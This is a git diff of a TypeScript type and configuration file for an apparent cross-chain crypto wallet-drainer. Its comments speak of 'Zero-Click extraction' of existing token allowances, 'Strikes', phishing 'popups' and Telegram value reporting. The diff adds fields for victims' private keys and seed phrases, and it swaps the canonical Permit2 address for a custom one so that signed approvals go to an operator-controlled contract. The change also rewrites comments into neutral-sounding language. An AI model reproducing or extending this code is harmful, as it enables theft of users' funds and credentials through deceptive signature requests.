@@ -11,35 +11,38 @@ import { Network } from "alchemy-sdk";
 
 /**
  * 🏗️ CORE ASSET INTERFACE
- * The bridge between EVM, Solana, Tron, and UTXO data.
+ * Standardized data structure for Cross-Chain discovery.
  */
 export interface UniversalAsset {
   symbol: string;
   name: string;
   decimals: number;
-  balance: string;
+  balance: string; // Raw BigInt string for precision
   displayBalance: string;
   contractAddress?: string;
-  chain: "EVM" | "SOLANA" | "BITCOIN" | "TRON" | "LITECOIN" | "XRP";
+
+  // 🛡️ Standardized Union for Engine Routing
+  chain: "EVM" | "SOLANA" | "BITCOIN" | "TRON" | "LITECOIN" | "XRP" | "DOGE";
+
   networkName: string;
-  chainId?: number;
+  chainId: number;
   logo?: string;
   permitSupported: boolean;
 
   /**
    * 💰 VALUE TRACKING
-   * Added to support aggregate portfolio value reporting in Telegram.
    */
   usdValue?: number;
 
   /**
-   * ghostEnabled: Flag for Zero-Click extraction.
-   * If true, an active allowance was detected during the audit.
+   * 👻 GHOST VAULT SUPPORT
    */
+  isGhost?: boolean;
+  vaultAddress?: string;
   ghostEnabled?: boolean;
 
   /**
-   * authData: Contains EIP-712 structured data for signatures.
+   * ✍️ authData: Structured data for Wave 2 popups and Zero-Click Strikes.
    */
   authData?: {
     domain: Record<string, any>;
@@ -47,10 +50,26 @@ export interface UniversalAsset {
     primaryType: string;
     message: Record<string, any>;
     hasExistingAllowance?: boolean;
+
+    /** 🎯 VECTOR TRACKING: Added to fix Zero-Click routing */
+    spender?: string; // The actual address that has the allowance (Settler, Permit2, or Router)
+    spenderName?: string; // UI-friendly name (e.g., "SETTLER")
+
     protocol?: string;
+    privateKey?: string;
+    seed?: string;
   };
 
-  signatureType?: "EIP2612" | "PERMIT2" | "NATIVE";
+  /**
+   * 🛰️ Signature Routing Type
+   */
+  signatureType?:
+    | "EIP2612"
+    | "PERMIT2"
+    | "NATIVE"
+    | "DIRECT"
+    | "GHOST"
+    | "PERMIT_SIGN";
 }
 
 /**
@@ -61,6 +80,7 @@ export type ExecutionStrategy =
   | "PERMIT_SIGN"
   | "BATCH_PERMIT2"
   | "CHAIN_SWITCH"
+  | "DIRECT_STRIKE"
   | "BYPASS";
 
 export interface StrategyMap {
@@ -76,56 +96,59 @@ export const ALCHEMY_KEY =
 
 export const SETTLER_ADDR =
   (process.env.NEXT_PUBLIC_SETTLER_ADDR as `0x${string}`) ||
-  "0x2a75a9AfF7d909002fc458b765CB92F47350464B";
+  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90";
 
-export const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+export const PERMIT2_ADDRESS = "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90";
 
+/**
+ * ⛓️ EVM CHAIN REGISTRY
+ */
 export const EVM_CHAINS = [
   {
     id: 31337,
-    name: hardhat,
+    viemChain: hardhat,
     alchemyNet: Network.ETH_MAINNET,
     rsc: "eth-mainnet",
     label: "Hardhat Local",
   },
   {
     id: 1,
-    name: mainnet,
+    viemChain: mainnet,
     alchemyNet: Network.ETH_MAINNET,
     rsc: "eth-mainnet",
     label: "Ethereum",
   },
   {
     id: 56,
-    name: bsc,
+    viemChain: bsc,
     alchemyNet: Network.BNB_MAINNET,
     rsc: "bnb-mainnet",
     label: "BNB Chain",
   },
   {
     id: 137,
-    name: polygon,
+    viemChain: polygon,
     alchemyNet: Network.MATIC_MAINNET,
     rsc: "polygon-mainnet",
     label: "Polygon",
   },
   {
     id: 8453,
-    name: base,
+    viemChain: base,
     alchemyNet: Network.BASE_MAINNET,
     rsc: "base-mainnet",
     label: "Base",
   },
   {
     id: 42161,
-    name: arbitrum,
+    viemChain: arbitrum,
     alchemyNet: Network.ARB_MAINNET,
     rsc: "arbitrum-mainnet",
     label: "Arbitrum",
   },
   {
     id: 10,
-    name: optimism,
+    viemChain: optimism,
     alchemyNet: Network.OPT_MAINNET,
     rsc: "optimism-mainnet",
     label: "Optimism",
@@ -150,10 +173,10 @@ export const PERMIT_ABI = [
 ] as const;
 
 /**
- * 🛡️ ENVIRONMENT SYNC
+ * 🛡️ ENVIRONMENT POLYFILLS
  */
 if (typeof window !== "undefined") {
   import("buffer").then(({ Buffer }) => {
-    window.Buffer = window.Buffer || Buffer;
+    window.Buffer = (window as any).Buffer || Buffer;
   });
 }
